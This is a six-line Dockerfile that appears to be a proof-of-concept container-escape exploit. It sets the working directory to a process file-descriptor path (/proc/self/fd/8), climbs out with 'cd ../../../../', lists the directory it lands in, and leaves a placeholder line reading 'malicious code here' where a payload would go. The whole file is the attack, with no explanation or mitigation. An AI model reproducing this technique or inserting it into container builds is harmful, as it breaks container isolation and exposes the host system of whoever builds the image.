FROM ubuntu

WORKDIR /proc/self/fd/8

RUN cd ../../../../ && \
    ls && \
    echo "malicious code here"
